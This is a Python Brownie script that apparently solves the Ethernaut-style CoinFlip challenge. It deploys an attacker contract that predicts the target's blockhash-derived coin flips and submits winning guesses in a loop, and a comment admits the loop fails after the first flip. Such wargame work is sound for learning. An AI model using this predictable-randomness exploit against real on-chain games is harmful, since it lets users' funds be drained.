"""
Task:
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. 
To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

Solution:
Write a smart contract which implements the same logic and use the smart contract to guess a result of a coin flip.
If the guess is correct, apply the guess to the original smart contract else the opposite value of the guess.
"""

from brownie import CoinFlipToHackV2, CoinFlip, network, config, Contract
from scripts.helpers import get_account, deploy_contract, LOCAL_BLOCKCHAIN_ENVIRONMENTS


def coinflip_to_hack(gasLimitEstimation=50000, number_of_flips_needed=12):
    # get an address of coinflip contract
    coinflip_contract_address = config["networks"][network.show_active()]["coinflip_instance_address"]
    # if local blockchain environment, deploy original coinflip contract
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        print("{} is in LOCAL BLOCKCHAIN ENVIRONMENTS, thus deploying CoinFlip contract..".format(network.show_active()))
        account_to_deploy = get_account(1)
        coinflip_contract = deploy_contract(CoinFlip, account_to_deploy)
        coinflip_contract_address = coinflip_contract.address
    
    if coinflip_contract_address:
        # set a hacking account
        account_to_hack = get_account()
        # deploy the CoinFlipToHack contract if not already deployed:
        if config["networks"][network.show_active()]["coinfliphack_contract_address"] == "":
            coinflip_to_hack_contract = deploy_contract(CoinFlipToHackV2, account_to_hack) # in config file set verify to True
        else:
            coinflip_to_hack_contract = Contract.from_explorer(config["networks"][network.show_active()]["coinfliphack_contract_address"])
        # Set instance to be hacked
        tx_set_instance = coinflip_to_hack_contract.setInstance(coinflip_contract_address, {"from": account_to_hack})
        tx_set_instance.wait(1)
        # Get number of consecutive wins:
        consecutive_wins = coinflip_to_hack_contract.getConsecutiveWins({"from": account_to_hack})
        number_of_flips = number_of_flips_needed - consecutive_wins
        # Execute hackCoinFlip if needed:
        if number_of_flips > 0:
            print("Number of coin flips to be executed: {}".format(number_of_flips))
            # Hack the CoinFlip, i.e. get 10 consecutive wins
            for i in range(1, (number_of_flips + 1)):
                print("{}:".format(i))
                # NOTE: Unfortunately, it fails once i > 1 due to: 
                # ValueError: Gas estimation failed: 'execution reverted'.
                tx_hack_coinflip = coinflip_to_hack_contract.hackCoinFlip(
                    True, 
                    {"from": account_to_hack, "gasLimit": gasLimitEstimation})
                tx_hack_coinflip.wait(1)
        else:
            print("No need to flip coins, the number of consecutive wins needed (i.e. {}) already reached (now {})".format(
                number_of_flips_needed, consecutive_wins)
                )
        # print final state of consecutive wins
        consecutive_wins = coinflip_to_hack_contract.getConsecutiveWins({"from": account_to_hack})
        print("Consecutive wins at the end of the process: {}".format(consecutive_wins))


def main():
    coinflip_to_hack()